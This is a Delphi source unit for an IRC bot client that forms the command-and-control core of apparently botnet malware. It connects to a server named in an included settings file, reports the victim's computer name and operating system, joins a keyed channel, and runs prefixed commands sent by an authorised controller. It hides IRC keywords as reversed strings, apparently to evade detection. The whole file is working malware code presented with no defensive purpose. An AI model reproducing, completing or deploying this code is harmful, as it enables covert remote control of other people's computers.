unit base;

interface

uses
  Windows,
  Winsock,
  variables,
  functions,
  miscfunctions;

 {$I Settings.ini}

type

  TIRCSocket = Class(TObject)
  Private
    mainSocket          :TSocket;
    mainAddr            :TSockAddrIn;
    mainWSA             :TWSAData;
    procedure ReceiveData;
    procedure ReadCommand(szText: String);
  Public
    mainNick            :String;
    mainBuffer          :Array[0..2048] Of Char;
    mainErr             :Integer;
    mainData            :String;
    mainHost            :String;
    mainIP              :String;
    function SendData(szText: String): Integer;
    procedure Initialize;
  End;

procedure JoinChannel(jChannel: String; jChanKey: String);
function SafeIRC(index: integer): String;
procedure PrivateMessageChannel(szText: String);
procedure PartChannel(pChannel: String; pChanKey: String);

var
  mainIRC       :TIRCSocket;
  ControlSet    :TControlSetting;

implementation

uses
  Commands;

Procedure TIRCSocket.ReadCommand(szText: String);
Var
  Parameters            :Array [0..4096] Of String;
  ParamCount            :Integer;
  iPos                  :Integer;
  bJoinChannel          :Boolean;
  szNick                :String;
Begin
  FillChar(Parameters, SizeOf(Parameters), #0);
  ParamCount := 0;
  If (szText = '') Then Exit;
  if (CheckAuthHost(Auth, szText)) then
  If (szText[Length(szText)] <> #32) Then szText := szText + #32;

  bJoinChannel := False;
  If (Pos(SafeIRC(0), szText) > 0) Or         //recieved motd
     (Pos(SafeIRC(1), szText) > 0) Or         //recieved 001 message
     (Pos(SafeIRC(2), szText) > 0) Then       //recieved 005 message
       bJoinChannel := True;

  Repeat
    iPos := Pos(#32, szText);

    If (iPos > 0) Then
    Begin
      Parameters[ParamCount] := Copy(szText, 1, iPos-1);
      Inc(ParamCount);
      Delete(szText, 1, iPos);
    End;
  Until (iPos <= 0);

  If (bJoinChannel) Then
  Begin
    JoinChannel(channel,channelkey);
  End;

  {ping}
  If (Parameters[0] = SafeIRC(3)) Then
  Begin
   ReplaceStr(SafeIRC(3), SafeIRC(4), Parameters[3]);
    SendData(SafeIRC(4) + #32+szText);
  End;

  {part}
  If (Parameters[1] = SafeIRC(5)) Then
  Begin
    szNick := Copy(Parameters[0], 2, Pos('!', Parameters[0])-2 );
  End;

  {kick}
  If (Parameters[1] = SafeIRC(6)) Then
  Begin
    szNick := Parameters[3];
  End;

  {nick exists}
  If (Parameters[1] = SafeIRC(7)) Then
  Begin
    mainNick := CreateNick;
    SendData(mainNick);
  End;

  {userhost}
  If (Parameters[1] = SafeIRC(8)) Then
  Begin
    SendData(SafeIRC(9)+' '+Parameters[2]);
  End;

  {host&ip}
  If (Parameters[1] = SafeIRC(10)) Then
  Begin
    mainHost := Parameters[3];
    Delete(mainHost, 1, Pos('@', mainHost));
    mainIP := fetchIPFromDNS(pChar(mainHost));
  End;

  {privmsg}
  //    :nick!ident@host privmsg #channel :text
  If (Parameters[1] = SafeIRC(11)) Then
  Begin
    Delete(Parameters[3], 1, 1);
    ControlSet.ControlNick := Copy(Parameters[0], 2, Pos('!', Parameters[0])-2);
    ControlSet.ControlIdent := Copy(Parameters[0], Pos('!', Parameters[0])+1, Pos('@', Parameters[0])-2);
    ControlSet.ControlHost := Copy(Parameters[0], Pos('@', Parameters[0])+1, Length(Parameters[0]));
    ControlSet.ControlChannel := Parameters[2];

    {ping#1}
    If (Parameters[3] = #1+SafeIRC(3)+#1) Then
    Begin
      Parameters[3][3] := 'O';
      SendData(SafeIRC(12)+' '+szNick+' '+Parameters[3]+Parameters[4]);
    End;

    {version}
    If (Parameters[3] = #1+SafeIRC(13)+#1) Then
      SendData(SafeIRC(13)+' '+szNick+' :'#1'VERSION - v 3.0');

    {bot command prefix}
    If (Parameters[3][1] = bot_prefix) Or
       (Parameters[3][1] = #1) Then
       Begin
         Delete(Parameters[3], 1, 1);
       ParseCommand(Parameters[3], Parameters[4], Parameters[5], Parameters[6], Parameters[7], Parameters[8], ControlSet);
       End;
  End;

End;

Procedure TIRCSocket.ReceiveData;
Var
  iPos          :Integer;
Begin
  Repeat
    mainErr := Recv(mainSocket, mainBuffer, SizeOf(mainBuffer), 0);

    If (mainErr > 0) Then
    Begin
      SetLength(mainData, mainErr);
      Move(mainBuffer[0], mainData[1], mainErr);

      Repeat
        iPos := 0;
        iPos := Pos(#13, mainData);

        If (iPos > 0) Then
        Begin
          ReadCommand(Copy(mainData, 1, iPos - 1));
          Delete(mainData, 1, iPos+1);
        End;
      Until iPos <= 0;
    End;
  Until mainErr <= 0;
End;

Procedure TIRCSocket.Initialize;
Begin
  If (mainSocket <> INVALID_SOCKET) Then
  Begin
    SendData(SafeIRC(17));
    CloseSocket(mainSocket);
    WSACleanUP();
  End;

  WSAStartUP($101, mainWSA);
  mainSocket := Socket(AF_INET, SOCK_STREAM, 0);
  mainAddr.sin_family := AF_INET;
  mainAddr.sin_port := hTons(server_port);
  mainAddr.sin_addr.S_addr := inet_addr(pChar(GetIPFromHost(DNS)));

  If (Connect(mainSocket, mainAddr, SizeOf(mainAddr)) <> 0) Then Exit;

  If (mainNick = '') Then
  mainNick := CreateNick;

  SendData(SafeIRC(15)+' '+mainNick+' "'+fetchLocalName+'" "'+GetOS+'" :'+mainNick);
  SendData(SafeIRC(16)+' '+mainNick);

  ReceiveData;

  WSACleanUP();

 End;

Function TIRCSocket.SendData(szText: String): Integer;
Begin
  Result := -1;
  If (mainSocket = INVALID_SOCKET) Then Exit;
  If (szText = '') Then Exit;

  If (szText[Length(szText)] <> #10) Then szText := szText + #10;
  Result := Send(mainSocket, szText[1], Length(szText), 0);
End;

function SafeIRC(index: integer): String;
begin
  Case index of
     0: result := ReverseString('DTOM');                      //MOTD
     1: result := ReverseString('100');                       //001
     2: result := ReverseString('500');                       //005
     3: result := ReverseString('GNIP');                      //PING
     4: result := ReverseString('GNOP');                      //PONG
     5: result := ReverseString('TRAP');                      //PART
     6: result := ReverseString('KCIK');                      //KICK
     7: result := ReverseString('334');                       //433
     8: result := ReverseString('663');                       //366
     9: result := ReverseString('TSOHRESU');                  //USERHOST
    10: result := ReverseString('203');                       //302
    11: result := ReverseString('GSMVIRP');                   //PRIVMSG
    12: result := ReverseString('ECITON');                    //NOTICE
    13: result := ReverseString('NOISREV');                   //VERSION
    14: result := ReverseString('NIOJ');                      //JOIN
    15: result := ReverseString('RESU');                      //USER
    16: result := ReverseString('KCIN');                      //NICK
    17: result := ReverseString('...gnitratseR: TIUQ');       //QUIT :Restarting...
    18: result := ReverseString('...gnitratseR: gnisolC');    //Closing :Restarting...
    19: result := ReverseString('...gnitixE: gnisolC');       //Closing :Exiting...
  else
    result := '';
  end;
end;

procedure JoinChannel(jChannel: String; jChanKey: String);
begin
MainIRC.SendData(SafeIRC(14)+' '+jChannel+' '+jChanKey);
end;

procedure PrivateMessageChannel(szText: String);
begin
mainIRC.SendData(SafeIRC(11)+' '+ControlSet.ControlChannel+' :'+szText);
end;

procedure PartChannel(pChannel: String; pChanKey: String);
begin
mainIRC.SendData(SafeIRC(5)+' '+pChannel+' '+pChanKey);
end;

end.
